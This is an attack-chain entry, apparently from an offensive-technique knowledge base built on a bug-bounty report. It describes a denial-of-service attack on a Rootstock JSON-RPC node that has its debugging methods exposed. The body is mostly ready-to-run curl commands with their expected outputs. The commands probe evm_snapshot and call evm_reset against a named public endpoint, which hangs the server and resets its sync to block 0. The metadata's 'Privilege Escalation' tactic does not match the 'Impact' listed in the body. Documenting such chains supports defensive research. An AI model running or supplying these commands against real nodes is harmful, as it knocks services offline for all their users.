---
tags:
  - dos
  - json-rpc
  - evm
  - rpc
  - rootstock
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Baseline-RPC-Block-Number-Check]]'
  - '[[procedures/Test-EVM-Snapshot-Methods]]'
  - '[[procedures/Trigger-EVM-Reset-DoS]]'
  - '[[procedures/Verify-Server-Responsiveness-Impact]]'
  - '[[procedures/Confirm-Blockchain-Sync-Reset]]'
step_count: 5
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:48.684Z'
description: >-
  A multi-step attack exploiting misconfigured JSON-RPC debugging methods on a
  Rootstock Labs RPC node to cause denial of service by resetting the EVM state
  and hanging the server.
id: 74c0e46f-4cf8-4fc8-9ba4-09b6a24660af
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# DoS Attack on Rootstock RPC Node via Enabled EVM Reset Debugging Method

Multi-stage attack chain demonstrating exploitation of enabled JSON-RPC debugging methods on the Rootstock Labs RPC node to perform a denial of service attack, causing the server to hang, reset blockchain sync, and become unresponsive to all users.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Baseline Check] --> B[Snapshot Testing]
    B --> C[Trigger Reset]
    C --> D[Verify Impact]
    D --> E[Confirm Reset]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#e74c3c
    style D fill:#f39c12
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Target Platform: Web-based JSON-RPC endpoint (e.g., https://bounty-node.rsk.co)
- Required Services/Ports: HTTPS (443) for RPC access
- Tech Stack: RskJ 0.4.0 on Java 1.8/Linux with nginx

### Initial Access Requirements

- Public network access to the RPC endpoint
- No authentication required (public-facing)
- Prior access: None, as it's an unauthenticated DoS

## Detailed Attack Procedures

### Step 1: Baseline RPC Block Number Check
procedure: [[procedures/Baseline-RPC-Block-Number-Check]]

**Objective**: Establish the current blockchain block number to verify the node's synced state before exploitation.

**Instructions**: Query the eth_blockNumber method using [[commands/rpc-eth-blocknumber-query]] to get the baseline.

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
```

**Expected Output**: JSON response with current block, e.g., {"jsonrpc":"2.0","id":1337,"result":"0x437ca"}.

**Success Indicators**:
- Valid JSON response with non-zero block number
- Node confirms synced state

### Step 2: Test EVM Snapshot Methods
procedure: [[procedures/Test-EVM-Snapshot-Methods]]

**Objective**: Probe for availability of debugging methods by creating EVM snapshots to assess state management capabilities.

**Instructions**: Send multiple requests to evm_snapshot using [[commands/rpc-evm-snapshot-create]] to test if debugging is enabled.

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_snapshot", "params": {}, "id":666}' https://bounty-node.rsk.co
```

Repeat 2-3 times to observe incremental snapshot IDs.

**Expected Output**: JSON responses like {"jsonrpc":"2.0","id":666,"result":"0x1"} or "0x2" for subsequent calls.

**Success Indicators**:
- Successful snapshot creation without errors
- Incremental snapshot IDs indicate debugging methods are exposed

### Step 3: Trigger EVM Reset DoS
procedure: [[procedures/Trigger-EVM-Reset-DoS]]

**Objective**: Exploit the evm_reset method to reset the EVM state, causing the server to hang and initiate DoS.

**Instructions**: Execute the reset using [[commands/rpc-evm-reset-trigger]] on the target endpoint.

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}' https://bounty-node.rsk.co
```

**Expected Output**: Request hangs indefinitely with no response, leading to server unresponsiveness.

**Success Indicators**:
- No immediate response from the server
- Subsequent requests time out

### Step 4: Verify Server Responsiveness Impact
procedure: [[procedures/Verify-Server-Responsiveness-Impact]]

**Objective**: Confirm the DoS impact by checking if basic RPC methods like client version now fail.

**Instructions**: Query web3_clientVersion before and after reset using [[commands/rpc-web3-clientversion-query]].

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"web3_clientVersion", "params": {}, "id":1337}' https://bounty-node.rsk.co
```

**Expected Output**: Initially successful (e.g., {"jsonrpc":"2.0","id":1337,"result":"RskJ/0.4.0/Linux/Java1.8/BAMBOO-1192882"}); post-DoS: 504 Gateway Time-out HTML.

**Success Indicators**:
- Pre-attack: Valid version response
- Post-attack: Timeout errors (504)

### Step 5: Confirm Blockchain Sync Reset
procedure: [[procedures/Confirm-Blockchain-Sync-Reset]]

**Objective**: Validate that the reset has forced the blockchain sync back to block 0, confirming full impact.

**Instructions**: Re-query eth_blockNumber using [[commands/rpc-eth-blocknumber-query]] after the reset.

```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
```

**Expected Output**: JSON response showing {"jsonrpc":"2.0","id":1337,"result":"0x0"}.

**Success Indicators**:
- Block number returns 0x0
- Node is desynced, affecting all users

## Attack Chain Summary

### Key Achievements

1. Confirmed exposure of debugging methods on public RPC endpoint
2. Triggered server hang and DoS via evm_reset
3. Demonstrated loss of service with 504 errors and sync reset

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Impact

---

*Last updated: 2023-10-01T00:00:00Z*
